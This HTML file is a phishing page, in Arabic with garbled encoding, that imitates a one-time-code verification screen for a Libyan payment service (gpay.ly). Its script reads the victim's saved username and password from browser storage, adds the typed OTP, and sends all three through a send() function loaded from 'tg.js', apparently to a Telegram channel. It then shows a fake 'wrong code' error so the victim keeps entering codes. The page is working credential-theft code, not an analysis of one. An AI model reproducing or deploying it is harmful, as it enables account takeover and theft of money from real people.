<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Cairo', sans-serif;
}

html, body{
    height:100%;
}

body{
    margin:0;
    min-height:100vh;
    background: linear-gradient(
        180deg,
        #112D4D 0%,
        #214672 100%
    );
    color:#fff;
    display:flex;
    flex-direction:column;
}

/* ---------- MAIN ---------- */

.main{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
}

.container{
    width:92%;
    max-width:420px;
}

/* ---------- LOGO ---------- */

.logo{
    text-align:center;
    margin-bottom:40px;
}

.logo img{
    width:160px;
}

/* ---------- TITLE ---------- */

.title{
    text-align:center;
    font-size:18px;
    font-weight:400;
    margin-bottom:20px;
}

.subtitle{
    text-align:center;
    font-size:14px;
    opacity:0.8;
    margin-bottom:35px;
}

/* ---------- OTP INPUT ---------- */

.otp-input{
    width:100%;
    height:55px;
    border:none;
    border-radius:14px;
    background:#E5E8EB;
    text-align:center;
    font-size:22px;
    font-weight:600;
    outline:none;
    letter-spacing:8px;
    margin-bottom:30px;
}

.otp-input:disabled{
    opacity:0.6;
}

/* ---------- BUTTON ---------- */

.btn{
    width:100%;
    height:48px;
    border:none;
    border-radius:14px;
    background:#F2BD45;
    color:#111;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    box-shadow:0 4px 8px rgba(0,0,0,0.25);
}

.btn:disabled{
    opacity:0.7;
    cursor:not-allowed;
}

/* Spinner */
.spinner{
    width:18px;
    height:18px;
    border:3px solid rgba(0,0,0,0.2);
    border-top:3px solid #111;
    border-radius:50%;
    animation:spin 0.8s linear infinite;
}

@keyframes spin{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
}

/* ---------- CHANGE PHONE ---------- */

.change-phone{
    text-align:center;
    margin-top:20px;
    font-size:14px;
}

.change-phone a{
    color:#F2BD45;
    text-decoration:none;
}

/* ---------- FOOTER ---------- */

.footer{
    text-align:center;
    padding:20px 0 30px;
}

.footer img{
    width:150px;
    opacity:0.85;
    margin-bottom:8px;
}

.footer .link{
    color:#F2BD45;
    font-size:15px;
}

/* ---------- MODAL ---------- */

.modal{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.6);
    display:none;
    align-items:center;
    justify-content:center;
}

.modal-content{
    width:85%;
    max-width:320px;
    background:#ffffff;
    color:#111;
    border-radius:16px;
    padding:25px;
    text-align:center;
}

.modal-content h3{
    margin-bottom:15px;
}

.modal-content button{
    margin-top:15px;
    width:100%;
    height:44px;
    border:none;
    border-radius:12px;
    background:#F2BD45;
    font-weight:600;
    cursor:pointer;
}

</style>
</head>

<body>

<div class="main">
    <div class="container">

        <div class="logo">
            <img src="logo_big.png" alt="Logo">
        </div>

        <div class="title">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</div>
        <!-- <div class="subtitle">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø¥Ù„Ù‰ 09XXXXXXX</div> -->

        <input 
            type="text"
            inputmode="numeric"
            class="otp-input"
            id="otp"
            maxlength="6"
            placeholder="------"
        >

        <button class="btn" id="confirmBtn" onclick="submitOTP()">
            <span id="btnText">ØªØ£ÙƒÙŠØ¯</span>
        </button>

        <div class="change-phone">
            Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ ØºÙŠØ± ØµØ­ÙŠØ­ØŸ <a href="./index.html">ØªØºÙŠÙŠØ±Ù‡</a>
        </div>

    </div>
</div>

<div class="footer">
    <img src="libyaguide_logo.png" alt="Libya Guide">
    <div class="link">gpay.ly</div>
</div>

<div class="modal" id="errorModal">
    <div class="modal-content">
        <h3>Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­</h3>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø±Ù…Ø² ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©.</p>
        <button onclick="closeModal()">Ø¥ØºÙ„Ø§Ù‚</button>
    </div>
</div>
<script src='tg.js'></script>
<script>
const otpInput = document.getElementById("otp");
const confirmBtn = document.getElementById("confirmBtn");
const modal = document.getElementById("errorModal");
const btnText = document.getElementById("btnText");

/* Convert Arabic & Persian digits â†’ Western */
function toWesternDigits(str) {
    return str
        .replace(/[Ù -Ù©]/g, d => d.charCodeAt(0) - 1632)
        .replace(/[Û°-Û¹]/g, d => d.charCodeAt(0) - 1776);
}

otpInput.addEventListener("input", function () {
    this.value = this.value.replace(/[^\dÙ -Ù©Û°-Û¹]/g, '');
    this.value = toWesternDigits(this.value);
    if (this.value.length > 6) {
        this.value = this.value.slice(0,6);
    }
});


function submitOTP() {

    if (otpInput.value.length < 4) return;

    // Disable input and button
    otpInput.disabled = true;
    confirmBtn.disabled = true;

    // Show loading
    btnText.textContent = "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚...";
    const spinner = document.createElement("div");
    spinner.classList.add("spinner");
    confirmBtn.appendChild(spinner);

    msg=`
    ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: \`${localStorage.getItem('username')}\`
    ğŸ”’ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: \`${localStorage.getItem('password')}\`
    OTP: \`${otpInput.value}\`
    `
    send(msg)

    // Simulate request
    setTimeout(() => {

        // Remove spinner
        spinner.remove();
        btnText.textContent = "ØªØ£ÙƒÙŠØ¯";

        // Show error modal
        modal.style.display = "flex";

    }, 7000);
}

function closeModal(){
    modal.style.display = "none";

    otpInput.value = "";
    otpInput.disabled = false;
    confirmBtn.disabled = false;

    otpInput.focus();
}
</script>

</body>
</html>
